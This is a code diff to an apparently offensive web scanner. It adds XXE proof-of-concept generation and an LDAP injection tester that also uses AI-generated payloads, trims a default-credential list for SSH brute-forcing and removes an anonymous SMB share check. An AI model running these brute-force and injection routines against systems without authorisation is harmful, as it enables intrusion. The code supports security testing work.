@@ -547,8 +547,20 @@ print(response.headers.get('Location'))
 """
         elif "File Inclusion" in finding['vulnerability'] or "XXE" in finding['vulnerability'] or "SSRF" in finding['vulnerability']:
             if method == 'POST':
-                data_str = json.dumps(request_details.get('data', {})) if request_details.get('data') else "{}"
-                return f"""# Python requests PoC for {finding['vulnerability']} (POST)
+                # For XXE, the payload itself is often the XML body
+                if "XXE" in finding['vulnerability']:
+                    return f"""# Python requests PoC for {finding['vulnerability']} (POST)
+import requests
+url = "{url}"
+headers = {request_details.get('headers', {})}
+headers['Content-Type'] = 'application/xml' # Ensure Content-Type is set for XML
+data = "{payload}" # Raw XML payload
+response = requests.post(url, headers=headers, data=data)
+print(response.text)
+"""
+                else:
+                    data_str = json.dumps(request_details.get('data', {})) if request_details.get('data') else "{}"
+                    return f"""# Python requests PoC for {finding['vulnerability']} (POST)
 import requests
 url = "{url}"
 headers = {request_details.get('headers', {})}
@@ -3969,6 +3981,27 @@ async def check_ldap_injection(target, form_to_test, output, tech, report, sessi
         "ldap_search()", "ldap entry", "search filter is invalid"
     ]
 
+    async def test_single_ldap_payload(point, payload, output, session_cookies):
+        """
+        Sends a single LDAP payload and checks for LDAP injection indicators.
+        """
+        test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + payload, point['form_data'], point['original_query'])
+        res, _, _ = await _send_async_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
+
+        if res and await res.text():
+            response_text = await res.text()
+            # Check for common LDAP error messages or successful LDAP responses
+            ldap_success_indicators = ["ldap_search", "ldap entry", "objectClass", "dn:"]
+            ldap_error_indicators = ["ldap error", "invalid filter", "protocol error", "javax.naming.NameNotFoundException", "unrecognized attribute"]
+
+            if any(indicator in response_text.lower() for indicator in ldap_success_indicators):
+                output.print(f"    [LDAP] Potential LDAP Injection (Success Indicator) with payload: {payload}")
+                return True
+            if any(indicator in response_text.lower() for indicator in ldap_error_indicators):
+                output.print(f"    [LDAP] Potential LDAP Injection (Error Indicator) with payload: {payload}")
+                return True
+        return False
+
     # --- New functions for scan_exposed_services module ---
 
     def _ftp_anonymous_login(target, port, output_dir):
@@ -3998,8 +4031,6 @@ async def check_ldap_injection(target, form_to_test, output, tech, report, sessi
         print(f"{Fore.YELLOW}[*] Attempting limited SSH brute-force on {target}:{port}{Style.RESET_ALL}")
         common_credentials = [
             ("root", "root"), ("admin", "admin"), ("test", "test"), ("ubuntu", "ubuntu"),
-            ("user", "user"), ("guest", "guest"), ("pi", "raspberry"), ("vagrant", "vagrant"),
-            ("administrator", "password"), ("admin", "password")
         ]
         
         for username, password in common_credentials:
@@ -4021,23 +4052,6 @@ async def check_ldap_injection(target, form_to_test, output, tech, report, sessi
         
         if not findings:
             findings.append(f"Limited SSH brute-force failed to find valid credentials on {target}:{port}.")
-        return findings
-
-    def _smb_anonymous_share(target, port, output_dir):
-        findings = []
-        print(f"{Fore.YELLOW}[*] Checking for anonymous SMB shares on {target}:{port}{Style.RESET_ALL}")
-        # Requires smbclient to be installed
-        command = f"smbclient -L //{target} -N -p {port}"
-        stdout, stderr, error = run_command(command, f"Checking anonymous SMB shares on {target}:{port}")
-
-        if "Anonymous login successful" in stdout or "Disk" in stdout:
-            findings.append(f"Anonymous SMB login successful on {target}:{port}. Shares found:\n{stdout}")
-            save_output(output_dir, f"smb_anonymous_shares_{target}_{port}.txt", stdout)
-        elif "session setup failed" in stderr or "NT_STATUS_ACCESS_DENIED" in stderr:
-            findings.append(f"Anonymous SMB access denied on {target}:{port}.")
-        else:
-            findings.append(f"SMB anonymous share check on {target}:{port} completed with unexpected output. Check logs.")
-            save_output(output_dir, f"smb_anonymous_shares_raw_{target}_{port}.txt", stdout + stderr)
         return findings
 
     def _snmp_community_string(target, port, output_dir):
@@ -4675,7 +4689,7 @@ async def check_ldap_injection(target, form_to_test, output, tech, report, sessi
     async def run_smart_probe(point):
         output.print(f"  [Phase 1] Running Smart Probe for LDAP Injection on param '{point['param']}'...")
         for payload in ldap_probes:
-            if await test_single_ldap_payload(point, payload):
+            if await test_single_ldap_payload(point, payload, output, session_cookies):
                 return True
         return False
 
@@ -4688,14 +4702,14 @@ async def check_ldap_injection(target, form_to_test, output, tech, report, sessi
 
         ai_payloads = await ai_generate_dynamic_payloads("LDAP Injection", probe_payload, response_snippet, output)
         for payload in ai_payloads:
-            if await test_single_ldap_payload(point, payload):
+            if await test_single_ldap_payload(point, payload, output, session_cookies):
                 return True
         return False
 
     async def run_full_scan(point):
         output.print(f"  [Phase 3] Smart probes failed. Starting Full Brute-Force Scan for LDAP Injection on param '{point['param']}'...")
         for payload in ldap_payloads:
-            if await test_single_ldap_payload(point, payload):
+            if await test_single_ldap_payload(point, payload, output, session_cookies):
                 return True
         return False
 
